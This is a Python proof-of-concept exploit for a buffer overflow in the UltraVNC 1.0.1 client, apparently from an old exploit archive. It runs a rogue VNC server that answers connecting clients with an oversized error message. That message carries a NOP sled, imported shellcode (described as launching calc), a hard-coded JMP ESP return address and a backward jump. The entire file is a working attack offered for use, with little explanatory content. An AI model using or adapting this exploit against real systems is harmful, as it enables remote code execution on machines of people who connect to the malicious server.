#!/usr/bin/python

#Ultr@VNC 1.0.1 Client Buffer Overflow - Luigi Auriemm
#POC by Paul Haas at Redspin.com
#Tested on WinXP SP 2: Launches Calc
from payload import buf

import struct
import socket
def shell_attack(target_machine, target_port): 

       HOST = target_machine                      # Localhost
       PORT = target_port                    # VNC Server
       BOFSZ = 1024                    # Buffer Size
       HEAD = b"RFB 003.006\n"          # VNC Header
       MESSAGE = b"Requires Ultr@VNC Authentication\n"
       NOP = b"\x90"                    # Standard x86 NOP
       JMP = b"\xE9\x1B\xFC\xFF\xFF"    # JMP To BUFF
       ESP = b"\xE0\x3A\xB4\x76"        # winmm.dll: JMP %esp
       POP = b"PASSWORD"                # RET 8

       # win32_exec - CMD=calc Size=160 http://metasploit.com
      

       #buff = MESSAGE+SHELLCODE+NOP SLED+RET ADDR+USELESS+JUMP TO BUFF
       buff = MESSAGE+buf+NOP*(BOFSZ-11-len(MESSAGE)-len(buf))
       buff = buff+ESP+POP+JMP

       #Egg = VNC Server Error Reply and Size of Reply + buff
       egg = struct.pack(b'LL',socket.htonl(0),socket.htonl(len(buff)))+buff

      
       #Server Loop
       while(1):
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.bind((HOST, PORT))
              s.listen(1)

              conn, addr = s.accept()
             

              conn.send(HEAD)
              data = conn.recv(12)

              conn.send(egg)
              conn.close()

       # milw0rm.com [2006-04-11]